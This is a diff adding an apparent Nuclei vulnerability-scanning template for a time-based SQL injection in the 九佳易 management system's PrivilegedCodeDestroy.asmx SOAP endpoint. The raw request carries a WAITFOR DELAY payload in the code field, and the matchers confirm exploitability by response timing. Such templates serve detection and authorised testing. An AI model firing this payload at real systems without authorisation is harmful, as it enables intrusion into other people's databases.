@@ -1,0 +1,46 @@
+id: poc-yaml-jiu-jia-yi-ms-privilegedcodedestroy-asmx-sqli
+info:
+  name: 九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    九佳易管理系统 PrivilegedCodeDestroy.asmx endpoint is vulnerable to SQL injection via the UpdatePrivilegedState SOAP request.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /Interface/licx/PrivilegedCodeDestroy.asmx HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: "http://tempuri.org/UpdatePrivilegedState"
+        Content-Type: text/xml;charset=UTF-8
+
+        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+           <soap:Header/>
+           <soap:Body>
+              <tem:UpdatePrivilegedState>
+                 <tem:code>'WAITFOR DELAY'0:0:{{t1}}</tem:code>
+              </tem:UpdatePrivilegedState>
+           </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<UpdatePrivilegedStateResponse"
+      - type: word
+        part: header
+        words:
+          - "application/soap+xml"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
